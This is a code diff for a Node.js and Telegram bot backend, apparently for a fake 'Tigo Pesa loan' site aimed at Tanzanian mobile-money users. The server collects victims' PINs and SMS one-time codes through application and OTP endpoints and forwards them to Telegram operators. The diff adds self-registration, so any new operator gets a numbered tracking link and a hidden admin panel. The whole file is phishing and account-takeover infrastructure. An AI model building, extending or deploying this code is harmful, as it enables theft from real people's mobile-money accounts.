@@ -1,15 +1,17 @@
 /**
- * **MIXX BY YAS - BACKEND SERVER (PROFESSIONAL ADMIN KEYWORD MAPPING)**
+ * **MIXX BY YAS - COMPLETE DYNAMIC MULTI-ADMIN BACKEND SERVER**
  * 
- * Includes:
- * - Professional numeric admin ID parameters (?admin=01, ?admin=02).
- * - Strict Tigo Pesa Tanzania number validation.
- * - Full multi-admin routing and session handling.
+ * Features:
+ * - Fully automated admin registration (?admin=01, ?admin=02, etc.) via /start.
+ * - Persistent JSON mapping storage so new admins work permanently.
+ * - Isolated message routing ensuring alerts go exclusively to the correct admin.
+ * - Strict Tigo Pesa Tanzania phone verification & complete session workflows.
  */
 
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 app.use(express.json());
@@ -30,13 +32,34 @@ let bot = null;
 const sessions = new Map();
 
 /**
- * **PROFESSIONAL ADMIN ID MAPPING DICTIONARY**
- * Map professional numbers (01, 02, etc.) to each admin's actual Telegram Chat ID.
+ * **DYNAMIC ADMIN STORAGE FILE PATH**
+ * Automatically tracks and saves all incoming admins.
  */
-const ADMIN_MAPPING = {
-  "01": "8524294724", // Link will be: ?admin=01
-  "02": "577853345"   // Link will be: ?admin=02
-};
+const ADMIN_FILE = path.join(__dirname, 'admins.json');
+
+function loadAdminMapping() {
+  try {
+    if (fs.existsSync(ADMIN_FILE)) {
+      const data = fs.readFileSync(ADMIN_FILE, 'utf8');
+      return JSON.parse(data);
+    }
+  } catch (err) {
+    console.error('[Error] Failed to load admins.json:', err);
+  }
+  return {
+    "01": "8524294724" // Primary baseline fallback
+  };
+}
+
+function saveAdminMapping(mapping) {
+  try {
+    fs.writeFileSync(ADMIN_FILE, JSON.stringify(mapping, null, 2), 'utf8');
+  } catch (err) {
+    console.error('[Error] Failed to save admins.json:', err);
+  }
+}
+
+let ADMIN_MAPPING = loadAdminMapping();
 
 function resolveAdminChatId(adminKeyOrId) {
   if (!adminKeyOrId) return DEFAULT_CHAT_ID;
@@ -96,7 +119,7 @@ async function initBot() {
   bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));
 
   /**
-   * **INSTANT /START COMMAND HANDLER WITH PROFESSIONAL NUMERIC LINKS**
+   * **AUTOMATIC DYNAMIC /START HANDLER FOR NEW ADMINS**
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = String(msg.chat.id);
@@ -107,20 +130,31 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Find professional numeric code or fallback to chat ID if not found
-    let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId) || chatId;
+    // Check if this chat ID is already registered in mapping
+    let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId);
 
-    // Professional link format: ?admin=01
+    if (!adminCode) {
+      // Automatically generate next sequential professional number (01, 02, 03...)
+      const existingKeys = Object.keys(ADMIN_MAPPING).filter(k => !isNaN(k));
+      const nextNum = existingKeys.length > 0 ? Math.max(...existingKeys.map(Number)) + 1 : 1;
+      adminCode = String(nextNum).padStart(2, '0');
+
+      ADMIN_MAPPING[adminCode] = chatId;
+      saveAdminMapping(ADMIN_MAPPING);
+      console.log(`[Admin] Registered new incoming admin: ${fullName} as code ${adminCode} (${chatId})`);
+    }
+
     const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${adminCode}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
     const userWelcomeInfo = 
-      `🚨 **New Admin/User Started the Bot!**\n\n` +
+      `🚨 **Admin Link Registered Successfully!**\n\n` +
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
-      `🏷 **Username:** ${username}\n` +
-      `🔗 **Browse Application Link:** ${cleanBrowseLink}\n` +
-      `🔗 **Admin Dashboard Link:** ${secureAdminLink}`;
+      `🔢 **Assigned Code:** \`${adminCode}\`\n` +
+      `🏷 **Username:** ${username}\n\n` +
+      `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}\n\n` +
+      `🔗 **Admin Dashboard Link:**\n${secureAdminLink}`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
       parse_mode: 'Markdown',
@@ -128,7 +162,9 @@ async function initBot() {
     }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
   });
 
-  // Attach callback_query handler
+  /**
+   * **CALLBACK QUERY HANDLER FOR ISOLATED ADMIN BUTTON ACTIONS**
+   */
   bot.on('callback_query', async (query) => {
     try {
       const actionData = query.data || '';
@@ -181,21 +217,18 @@ async function initBot() {
 }
 
 /**
- * **EXPLICIT ROUTE FOR USER APPLICATION (ROOT URL)**
+ * **EXPLICIT FRONTEND ROUTES**
  */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app.html'));
 });
 
-/**
- * **SECURED / HIDDEN ROUTE FOR ADMIN PANEL**
- */
 app.get('/secret-admin-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
 /**
- * **SUBMIT APPLICATION (PIN ENTRY)**
+ * **SUBMIT APPLICATION (PIN ENTRY) - TARGETED EXCLUSIVELY TO CORRECT ADMIN**
  */
 app.post('/api/submit-application', (req, res) => {
   try {
@@ -269,7 +302,7 @@ app.get('/api/check-status/:userId', (req, res) => {
 });
 
 /**
- * **RECEIVE SMS OTP & PROMPT ADMIN**
+ * **RECEIVE SMS OTP & PROMPT CORRECT ADMIN**
  */
 app.post('/api/submit-otp', (req, res) => {
   try {
@@ -337,10 +370,10 @@ app.post('/api/request-new-otp', (req, res) => {
   }
 });
 
-// Start initialization & HTTP server
+// Initialize server and bot polling/webhooks
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-  
+    
